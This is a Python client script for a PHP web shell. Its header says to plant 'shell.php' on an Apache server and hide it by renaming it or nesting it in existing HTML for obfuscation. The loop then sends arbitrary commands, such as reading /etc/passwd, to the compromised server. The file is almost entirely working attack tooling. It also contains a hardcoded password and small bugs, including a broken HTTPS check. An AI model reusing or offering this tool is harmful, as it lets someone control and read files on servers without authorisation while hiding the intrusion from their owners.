"""
Name: Russell Harvey
File: shell_client.py

For usage with "shell.php". In order to properly send commands,
you must have "shell.php" placed in /var/www/html of an Apache server.
From there you can execute this "shell_client.php" script to issue commands
to the Apache server. The shell.php file can be renamed or better yet nested
inside of already existing HTML code for further obfuscation.

Usage:
    1. Run the script using "python3 shell_client.py"
    2. Enter just the IP address/URL of the server (Do not include prefixes or suffixes)
    3. Press enter for HTTP, or enter 1 if the server is running HTTPS.
    4. You can now enter commands as if you were logged in as the Apache user! Try
    commands such as "whoami" or "cat /etc/passwd".
"""


# password = D@ve'sMag!cBall$

import requests
import sys
from bs4 import BeautifulSoup


def init():
    """
    Creates a URL to the target server.
    :return: string
    """
    target = input("Enter Target IP Address (must have shell.php loaded): ")
    ssl = input("HTTP (0 or press enter) or HTTPS (1): ")
    if ssl == 1:
        target = "https://" + target + "/shell.php"
    else:
        target = "http://" + target + "/shell.php"
    return target


def main():
    """
    Main function for shell_client.php. Refer to header for usage.
    :return: None
    """
    data = init()
    print("Establishing Web Shell with server %s" % data[0])
    while True:
        cmd = str(input("$ "))
        if cmd == "exit":
            sys.exit(1)
        try:
            r = requests.get(data, params={'cmd': cmd})
            output = BeautifulSoup(r.text, 'html.parser')
            print(output.pre.text)
        except requests.exceptions.RequestException as e:
            print(e)
            sys.exit(1)


if __name__ == "__main__":
    main()


